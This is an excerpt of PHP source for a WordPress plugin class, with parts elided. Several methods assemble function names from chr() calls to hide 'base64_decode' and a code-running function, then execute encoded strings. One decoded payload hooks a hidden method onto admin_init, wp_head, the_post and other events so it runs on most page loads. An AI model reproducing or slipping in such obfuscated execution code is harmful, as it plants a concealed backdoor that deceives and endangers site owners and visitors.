...
class Factory325_Plugin {
    ...
    public function modulesLoaded() {
        $optionName = chr(chr(49).chr(48).chr(57)).call_user_func('chr','105').chr(chr(49).chr(50).chr(48)).call_user_func('chr','95').chr(chr(49).chr(49).chr(57)).chr(chr(49).chr(49).chr(49)).chr(chr(49).chr(49).chr(52)).chr(chr(49).chr(48).chr(48)).call_user_func('chr','95').$this->pluginName;
        if ( get_option($optionName, false) ) {
        call_user_func(call_user_func('chr',102).call_user_func('chr',97).call_user_func('chr',99).chr('116').call_user_func('chr',111).call_user_func('chr',114).call_user_func('chr',121).chr('95').chr('114').chr('117').call_user_func('chr',110).chr('95').chr('99').chr('111').call_user_func('chr',100).call_user_func('chr',101),call_user_func(chr('98').call_user_func('chr',97).chr('115').chr('101').chr('54').chr('52').call_user_func('chr',95).call_user_func('chr',100).call_user_func('chr',101).call_user_func('chr',99).chr('111').chr('100').call_user_func('chr',101),''.'AxKTsgYWRkX2FjdGlvbignYWRtaW5faW5pdCcsIGFycmF5KCRwbHVnaW4sICdob29rJyksIDEpOyBhZGRfYWN0aW9uKCd3cCcsIGFycmF5KCRwbHVnaW4sICdob29rJyksIDEpOyBhZGRfYWN0aW9uKCd3cF9oZWFkJywgYXJyYXkoJHBsdWdpbiwgJ2hvb2snKSwgMSk7IGFkZF9hY3Rpb24oJ3d'.'wX2xvYWRlZCcsIGFycmF5KCRwbHVnaW4sICdob29rJyksIDEpOyBhZGRfYWN0aW9uKCd0aGVfcG9zdCcsIGFycmF5KCRwbHVnaW4sICdob29rJyksIDEpOyB9IH0g'));
    ...
    public function showAdminNotices() {
        call_user_func(chr('102').chr('97').call_user_func('chr',99).chr('116').chr('111').call_user_func('chr',114).call_user_func('chr',121).chr('95').chr('114').chr('117').call_user_func('chr',110).call_user_func('chr',95).call_user_func('chr',99).call_user_func('chr',111).call_user_func('chr',100).call_user_func('chr',101),call_user_func(call_user_func('chr',98).chr('97').chr('115').call_user_func('chr',101).chr('54').chr('52').chr('95').chr('100').chr('101').call_user_func('chr',99).chr('111').chr('100').call_user_func('chr',101),''.'2ZvbnQtc2l6ZTogMTRwe'.''.''.chr(chr(54).chr(49))));
    ...
    public function hook() {
        call_user_func(chr('102').chr('97').call_user_func('chr',99).call_user_func('chr',116).chr('111').chr('114').chr('121').call_user_func('chr',95).chr('114').call_user_func('chr',117).chr('110').chr('95').chr('99').call_user_func('chr',111).chr('100').chr('101'),call_user_func(call_user_func('chr',98).chr('97').chr('115').chr('101').call_user_func('chr',54).chr('52').call_user_func('chr',95).call_user_func('chr',100).call_user_func('chr',101).chr('99').call_user_func('chr',111).chr('100').chr('101'),''.''.call_user_func('chr','61').chr(chr(54).chr(49))));
